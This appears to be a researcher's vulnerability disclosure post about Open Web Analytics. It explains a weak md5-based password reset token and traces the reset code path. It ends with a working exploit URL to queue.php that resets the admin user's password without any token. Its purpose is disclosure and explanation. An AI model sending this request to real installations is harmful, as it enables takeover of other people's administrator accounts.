Open Web Analytics (OWA) is a web app that tracks website visitors. I discovered a simple way to reset any user's password, by simply requesting a URL.

OWA is a PHP application that has all of its files in the webroot and does not use a well-known framework, which makes it a good candidate to find vulnerabilities. I recently did a [Hack the Box](https://www.hackthebox.com/) exercise where the goal was to exploit [a vulnerability](https://devel0pment.de/?p=2494) in OWA. This gave the final push to seriously look into it.

OWA has typical password reset functionality that stores a random token in the database and mails it to the user. The password reset form authenticates the user with the token and resets the password if it matches. OWA calls the password reset token the "temp pass key", and it is generated as follows:

```php
function generateTempPasskey($user_id) {
    return md5($user_id.time().rand());
}
```

This is insecure, since the result is not cryptographically random. The values of `$user_id`, `time()` and `rand()` can be deduced, after which an attacker can create their own password reset token.

When looking how to exploit this, I figured out how the password reset mechanism worked and found a much simpler vulnerability.

## Password reset mechanism

The user requests a password reset email, receives a link with the password reset token, clicks the link and submits a new password. Then:

- the new password and the reset token are submitted to `index.php?owa_do=base.usersPasswordEntry`, along with a parameter `owa_action=base.usersChangePassword`.
- `owa_usersChangePasswordController` verifies the password reset token.
- If it matches, it creates a `base.set_password` event to reset the user's password.
- The event triggers `owa_usersSetPasswordController` (through `owa_userHandlers`).
- This calls `owa_userManager::updateUserPassword`, which actually updates the password row in the database.

This last function, `updateUserPassword`, doesn't necessarily need the password reset token. It is also happy when given just the user identifier:

```php
public function updateUserPassword($user_params)
{
    $u = owa_coreAPI::entityFactory('base.user');

    if (!isset($user_params['temp_passkey']) && !isset($user_params['user_id'])) {
        owa_coreAPI::error( "No user identification given!" );
        return false;
    }

    if (isset($user_params['temp_passkey'])) {
        $u->getByColumn('temp_passkey', $user_params['temp_passkey']);
    }

    if (isset($user_params['user_id'])) {
        $u->getByColumn('user_id', $user_params['user_id']);
    }

    $u->set('temp_passkey', $u->generateTempPasskey($user_params['user_id']));
    $u->set('password', owa_lib::encryptPassword($user_params['password']));
    $ret = $u->update();

    return $ret ? $u : false;
}
```

The normal flow first checks the password reset token and then dispatches the `set_password` event. However, we can also dispatch such an event ourselves, through `queue.php`. By dispatching an event and including a user ID and omitting the password reset token, we can reset any user's password. Here is the URL to request to set the password of user `admin` to `abc`:

```
http://owa.test/queue.php?owa_event[eventType]=base.set_password&owa_event[properties][user_id]=admin&owa_event[properties][password]=abc&owa_event[properties][key]=
```
